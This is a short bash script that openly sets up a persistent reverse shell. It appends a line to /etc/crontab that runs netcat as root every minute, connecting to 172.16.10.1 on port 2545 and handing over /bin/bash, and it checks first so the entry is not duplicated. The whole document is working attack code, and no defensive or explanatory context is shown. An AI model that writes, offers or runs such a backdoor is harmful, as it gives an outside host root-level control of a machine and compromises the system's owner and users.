#!/bin/bash

echo "Setting up reverse shell via crontab..."

if ! grep -q "nc 172.16.10.1 2545" /etc/crontab; then
  echo "* * * * * root nc 172.16.10.1 2545 -e /bin/bash" >> /etc/crontab
else
  echo "Scheduled reverse shell is alredy set up!"
fi